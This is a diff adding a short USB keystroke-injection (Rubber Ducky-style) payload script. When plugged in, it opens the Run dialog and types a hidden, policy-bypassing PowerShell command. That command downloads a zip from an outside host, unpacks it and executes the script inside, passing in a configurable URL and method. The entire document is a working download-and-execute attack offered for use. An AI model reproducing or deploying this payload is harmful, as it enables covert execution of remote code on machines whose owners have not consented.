@@ -1,0 +1,9 @@
+ATTACKMODE HID
+
+DEFINE #URL https://example.com/file.example
+DEFINE #METHOD 1
+
+GUI R
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $env:url=#URL;$env:method=#METHOD;irm -Uri 'https://jakoby.lol/kiv' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+ENTER
